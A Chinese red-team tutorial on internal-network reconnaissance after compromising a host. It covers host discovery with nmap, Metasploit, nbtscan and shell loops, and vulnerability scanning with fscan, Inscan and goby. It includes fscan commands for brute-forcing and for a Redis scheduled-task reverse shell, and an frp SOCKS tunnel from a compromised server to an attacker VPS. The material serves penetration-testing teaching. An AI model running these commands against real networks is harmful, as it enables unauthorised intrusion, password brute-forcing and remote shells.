## ****前言****

当我们能访问到⽬标内⽹任何资源之后，我们就可以对⽬标内⽹进⾏更深层次的信息搜集⽐如：主机收集、IP 段搜集、端⼝开放服务、Web 资产数量、漏洞类型。

接下来是一些工具的食用姿势，仅供参考。假设我们已经获取到 web-2012 的权限，接下来如何对内⽹进⾏信息搜集，内⽹扫描。

##  ** **信息收集****

###  ** **主机存活探测****

### 基于netbios的内网存活主机发现

 **netbios简介**

IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以  
使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为  
了给局域网提供网络以及其他特殊功能。  
系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于  
NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使  
用NetBIOS协议可以方便地实现消息通信及资源的共享。

 **nmap**

sudo nmap -sU --script nbstat.nse -p137 192.168.10.1/24 -T4

![1647401877_62315b95d712115f98193.png!small?1647401878367](https://image.3001.net/images/20220316/1647401877_62315b95d712115f98193.png!small?1647401878367)

> 注：nmap连自己都会扫，及时没有netbios也会提示主机存活。比如kali linux本身。

##### MSF——auxiliary/scanner/netbios/nbname

![1647401884_62315b9c02e51e5928163.png!small?1647401884553](https://image.3001.net/images/20220316/1647401884_62315b9c02e51e5928163.png!small?1647401884553)

效果没那么好。

 **nbtscan**

Nbtscan 是⼀款能迅速查找电脑IP地址以及MAC地址的软件，不过只能⽤于局域⽹，显示IP、主机名、⽤户名称以 及MAC地址。

nbtscan -v -s : 192.168.43.0/24 # windows和linux通用。

通过 nbtscan 在内⽹渗透中所使⽤的场景⽬的就是为了帮助我们快速识别那些机器是域机器，那些机器是 DC，那 些机器是⼯作组机器。

kali下的nbtscan：

![1647401891_62315ba300fb1f2df053e.png!small?1647401891670](https://image.3001.net/images/20220316/1647401891_62315ba300fb1f2df053e.png!small?1647401891670)

windows下的nbtscan.exe：（会剔除本机所在的机器）。

![1647401896_62315ba8167def5e100f3.png!small?1647401896770](https://image.3001.net/images/20220316/1647401896_62315ba8167def5e100f3.png!small?1647401896770)

### 基于SMB协议的内网存活主机发现

 **简介**

SMB(全称是Server Message
Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。SMB最初是IBM的贝瑞·费根[鲍姆](https://baike.baidu.com/item/%E9%B2%8D%E5%A7%86)（Barry
Feigenbaum）研制的，其目的是将[DOS操作系统](https://baike.baidu.com/item/DOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F)中的本地文件接口“中断13”改造为[网络文件系统](https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/9719420)。

 **nmap**

nmap -sS --script smb-enum-shares.nse -p 445 192.168.43.1/24

![1647401902_62315bae23225c36f5636.png!small?1647401902944](https://image.3001.net/images/20220316/1647401902_62315bae23225c36f5636.png!small?1647401902944)

##### MSF——auxiliary/scanner/smb/smb_version

msf6 auxiliary(scanner/netbios/nbname) > use auxiliary/scanner/smb/smb_version  
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.43.1/24  
rhosts => 192.168.43.1/24  
msf6 auxiliary(scanner/smb/smb_version) > set threads 10  
threads => 10  
msf6 auxiliary(scanner/smb/smb_version) > exploit

![1647401907_62315bb3d866c6d79ea0a.png!small?1647401908830](https://image.3001.net/images/20220316/1647401907_62315bb3d866c6d79ea0a.png!small?1647401908830)

 **基于CMD**

需要开启telnet窗口。

for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445

 **基于powershell**

# 单IP，OK  
445 | %{ echo ((new-object Net.Sockets.TcpClient).Connect("192.168.43.83",$_))
"$_ is open"} 2>$null  
# 多IP  
80..85 | % { $a = $_; 445 | % {echo ((new-object
Net.Sockets.TcpClient).Connect("192.168.43.$a",$_)) "Port $_ is open"}
2>$null}  
Port 445 is open  
#多IP，多port  
80..85 | % { $a = $_; write-host "- - - - -"; write-host "192.168.43.$a";
137,445 | % {echo ((new-object
Net.Sockets.TcpClient).Connect("192.168.43.$a",$_)) "Port $_ is open"}
2>$null}  
\- - - - -  
192.168.43.80  
\- - - - -  
192.168.43.81  
\- - - - -  
192.168.43.82  
\- - - - -  
192.168.43.83  
Port 445 is open  
\- - - - -  
192.168.43.84  
\- - - - -  
192.168.43.85

### 基于ARP协议的内网存活主机发现。

 **概念**

ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输
协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的
ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址。

 **nmap**

nmap -sn -PR 192.168.10.1/24  
-sn # 不扫描端口，只扫描主机  
-PR # ARP ping扫描

![1647401914_62315bbac428f15b6494f.png!small?1647401915376](https://image.3001.net/images/20220316/1647401914_62315bbac428f15b6494f.png!small?1647401915376)

##### MSF——auxiliary/scanner/discovery/arp_sweep

![1647401920_62315bc03635eeeb6b0e7.png!small?1647401920750](https://image.3001.net/images/20220316/1647401920_62315bc03635eeeb6b0e7.png!small?1647401920750)

###  **基于SNMP协议的内网存活主机发现**

 **简介**

SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的  
协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和  
SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这  
些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之  
上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命  
令，上传各种本地的网络信息。

 **nmap**

nmap -sU -T4 --script snmp-brute 192.168.10.0/24

##### MSF——auxiliary/scanner/snmp/snmp_enum

msf6 auxiliary(scanner/snmp/snmp_enum) > set rhosts 192.168.43.1/24  
rhosts => 192.168.43.1/24  
msf6 auxiliary(scanner/snmp/snmp_enum) > set threads 10  
threads => 10  
msf6 auxiliary(scanner/snmp/snmp_enum) > exploit

### 基于ICMP协议的内网存活主机发现

 **简介**

ICMP是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指
网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输 用户数据，但是对于用户数据的传递起着重要的作用。

 **nmap**

nmap -PE -sn -T4 192.168.43.1/24

![1647401928_62315bc881afb3c6444ce.png!small?1647401928930](https://image.3001.net/images/20220316/1647401928_62315bc881afb3c6444ce.png!small?1647401928930)

##### cmd

# 打印在屏幕当中  
for /L %P in (1,1,254) DO @ping -w 1 -n 1 192.168.43.%P | findstr "TTL="  
来自 192.168.43.18 的回复: 字节=32 时间<1ms TTL=64  
来自 192.168.43.83 的回复: 字节=32 时间=1ms TTL=128  
来自 192.168.43.106 的回复: 字节=32 时间<1ms TTL=128  
# 输入到文件当中（windows）  
for /l %p in (1,1,254) do @ping -l 1 -n 3 -w 40 192.168.1.%p & if errorlevel 1
(echo 192.168.1.%p>>na.txt) else (echo 192.168.1.%p>>ok.txt)  
# 输入到文件当中（linux），未成功  
for i in {1..254}; do ping -q -i 0.01 -c 3 192.168.1.$i &> /dev/null && echo
192.168.1.$i is alive; done

###  ** **资产存活探测****

 **PTscan**

PTscan(Phantom scanner)
是一款界面友好的轻量级web应用资产扫描器，适合于内网渗透测试环境下web的资产快捷识别，只需Python环境，无需第三方扩展库，扫描结果使用zoomeye网页样式。

下载地址：<https://github.com/phantom0301/PTscan>

使用python2的pyinstaller库打包成exe。

pyinstaller -F -w ptscan.py

具体使用语法：

Usage: python PTscan.py {-f /xxx/xxx.txt or -h 192.168.1} [-p 21,80,3306] [-m
50] [-t 10] [-n] [-b] [-r]  
-f 指定扫描⽬标⽂件，⽂件格式如list.txt所示，同时⽀持IP和URL  
-h 指定扫描IP或IP段，⽀持段扫描，如192.168.1 即为扫描C段，192.168 即为扫描B段  
-p 指定扫描端⼝，缺省使⽤程序中的配置端⼝  
-m 指定线程数  
-t 指定timeout  
-n 不进行ping操作，直接扫描  
-b 开启Banner识别  
-r reverseIP

扫描示例：

python2 PTscan.py -h 10.10.10 -p 80,8080,8888 -m 50 -t 10 -n -b

当ptscan扫描完成后会在当前路径下生成一个html文件。使用浏览器打开，即可看到扫描出来的web资产：banner、中间件、url、开放端口。

##  ** **漏洞扫描****

###  ** **Inscan****

边界打点后的⾃动化内⽹⼯具，完全与服务端脱离。服务端只⽤于⽣成poc，⽹段信息等配置。

  * 多平台，单一的二进制文件，免依赖;
  * 支持自动可视化多级隧道，通过后台按钮开关即可穿越多层网络;
  * 支持ipv6的扫描器;
  * 快速直观查看多网卡机器，方便快速定位能穿多层网络机器;
  * 通过已知密码生成社工字典，快速横向内网;
  * 内网B/S架构系统自动化爆破，验证码自动识别;
  * 快速资产识别，站点截图;
  * 通过扫描到的资产自动化进行网站目录扫描；

官⽹地址：<https://www.inbug.org/>

然后注册一个用户生成一个Inscan
Agent：![1647401937_62315bd13b01588d585c6.png!small?1647401937570](https://image.3001.net/images/20220316/1647401937_62315bd13b01588d585c6.png!small?1647401937570)![1647401950_62315bde8a73be03a4455.png!small?1647401950966](https://image.3001.net/images/20220316/1647401950_62315bde8a73be03a4455.png!small?1647401950966)

下载后在目标终端运行即可（尽量使用管理员权限，否则有的时候会卡住）。

![1647401955_62315be390dcc1806b864.png!small?1647401956181](https://image.3001.net/images/20220316/1647401955_62315be390dcc1806b864.png!small?1647401956181)

扫描完成后会在当前路径下⽣产⼀个 poc.db ⽂件：

![1647401960_62315be859dfbc296c59a.png!small?1647401960587](https://image.3001.net/images/20220316/1647401960_62315be859dfbc296c59a.png!small?1647401960587)

把 poc.db 拖回本地也⾏，或者再次运⾏ again ，访问⽬标 ip:54088 即可看到扫描结果：

![1647401968_62315bf0878798ac7c302.png!small?1647401968995](https://image.3001.net/images/20220316/1647401968_62315bf0878798ac7c302.png!small?1647401968995)

###
![1647401972_62315bf4641cb1bd6b965.png!small?1647401972769](https://image.3001.net/images/20220316/1647401972_62315bf4641cb1bd6b965.png!small?1647401972769)
** **fscan****

一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能，在不指定特定模块的前提下，默认启用所有模块。

下载地址：<https://github.com/shadow1ng/fscan>

常用命令：

fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt
(加载指定文件的用户名、密码来进行爆破)  
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)  
fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
fscan.exe -hf ip.txt (以文件导入)  
fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理
http://127.0.0.1:8080)  
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)  
fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389->rdp扫描)

  * 特殊手法：  
针对B段渗透时，建议使用单模块测试，使用全模块时速度会比较慢，应该是6.3版本的bug，新版本未做测试，不清楚具体情况。除此之外，1.6.3模块在探测ftp的时候错误会一直卡顿，而不是跳过。

  * 扫描手法：exe -h 175.34.1.1/16 -m <module_name>
  * 推荐模块（基于7.0）：

# 数据库爆破  
mgo # mongodb数据库  
redis # redis数据库  
psql # postgresql数据库  
mssql # SQL Server数据库  
mysql # mysql数据库  
mem # mem代表Memcached，是一个内存对象缓存服务，跟Redis很相像。  
注：oracle虽然在更新记录中指出支持，但是在打包后，还是无法指定该模块，查看时也无法看到。  
# 服务爆破  
smb # 采用SMB协议的文件共享服务  
rdp # windows的远程桌面服务  
ftp # 文件传输服务  
ssh # linux下的远程登录协议  
# 漏洞扫描  
ms17010 通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，利用SMB协议，也称作永恒之蓝  
cve20200796 SMB 3.1.1协议远程代码执行漏洞，也称作永恒之黑  
fcgi 快速通用网关接口，fastcgi，远程代码执行等漏洞  
web 收集资产并且进行漏洞扫描  
# 查看所有可用模块  
fscan.exe -m -h

使用案例：

C:\Windows\Temp>fscan.exe -h 10.10.10.0/24 -o 10.txt  
___ _  
/ _ \ ___ ___ _ __ __ _ ___| | __  
/ /_\/____/ __|/ __| '__/ _` |/ __| |/ /  
/ /_\\\\_____\\__ \ (__| | | (_| | (__| <  
\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\  
fscan version: 1.7.0  
scan start  
(icmp) Target '10.10.10.3' is alive  
(icmp) Target '10.10.10.12' is alive  
(icmp) Target '10.10.10.10' is alive  
(icmp) Target '10.10.10.11' is alive  
(icmp) Target '10.10.10.20' is alive  
icmp alive hosts len is: 5  
10.10.10.10:445 open  
10.10.10.10:135 open  
10.10.10.3:445 open  
10.10.10.3:135 open  
10.10.10.12:445 open  
10.10.10.12:135 open  
10.10.10.12:80 open  
10.10.10.20:445 open  
10.10.10.20:135 open  
10.10.10.11:445 open  
10.10.10.11:135 open  
10.10.10.20:88 open  
10.10.10.10:88 open  
10.10.10.11:88 open  
NetInfo:  
[*]10.10.10.12  
[->]web-2012  
[->]192.168.1.109  
[->]10.10.10.12  
NetInfo:  
[*]10.10.10.10  
[->]AD-2016  
[->]10.10.10.10  
NetInfo:  
[*]10.10.10.3  
[->]web-2003  
[->]10.10.10.3  
WebTitle:http://10.10.10.12 200 IIS Windows Server  
[+] 10.10.10.20 MS17-010 (Windows Server 2016 Standard 14393)  
NetInfo:  
[*]10.10.10.11  
[->]AD2-2016  
[->]10.10.10.11  
[+] 10.10.10.3 MS17-010 (Windows Server 2003 3790 Service Pack 2)  
[+] 10.10.10.11 MS17-010 (Windows Server 2016 Standard 14393)  
[+] 10.10.10.10 MS17-010 (Windows Server 2016 Standard 14393)  
scan end  
C:\Windows\Temp>

###  ** **goby****

Goby号称新一代的网络安全测试工具，有IP存活探测、端口扫描、资产探测、主机识别等功能，内置代理功能。代理方式有socket和pcap两种，socket支持socks和HTTP两种，均支持身份验证。

红队人员V P s（192.168.10.110）配置frps.ini

[common]  
bind_addr = 0.0.0.0  
bind_port = 7000

然后启动frp服务端：

./frps -c frps.ini

![1647401993_62315c096f35d58a7aa53.png!small?1647401993874](https://image.3001.net/images/20220316/1647401993_62315c096f35d58a7aa53.png!small?1647401993874)

在目标网络边界weblogic配置frpc.ini

[common]  
server_addr = 192.168.10.110（红队人员）  
server_port = 7000  
[plugin_socks]  
type = tcp  
remote_port =7777  
plugin = socks5

然后启动客户端

./frpc.exe -c frpc.ini

![1647402003_62315c13eb1c6cbe0ad52.png!small?1647402004198](https://image.3001.net/images/20220316/1647402003_62315c13eb1c6cbe0ad52.png!small?1647402004198)

在goby中设置socks代理：

![1647402009_62315c19561eec503e1c2.png!small?1647402009674](https://image.3001.net/images/20220316/1647402009_62315c19561eec503e1c2.png!small?1647402009674)

然后新建任务，配置参数进行漏洞扫描：

![1647402015_62315c1f5daaa6e4fd742.png!small?1647402015892](https://image.3001.net/images/20220316/1647402015_62315c1f5daaa6e4fd742.png!small?1647402015892)

goby在渗透测试当中探测C段还OK，如果是B段的话，设置特殊端口，然后再扫描。大批量扫的话，就要看Inscan和fscan了。

##  ** **结尾****

在内⽹渗透中，⼀些内⽹扫描⼯具能够帮助我们红队⼈员减去很多时间，不⽤⼿动去信息搜集、不⽤⼿动去漏洞探测，因此掌握⼀个漏洞扫描器或者多个扫描器的使⽤⽅法是我们红队⼈员最基本的要求。

除了以上的metasploit、Nmap...等等一些优秀的工具等着大家去发掘和使用。

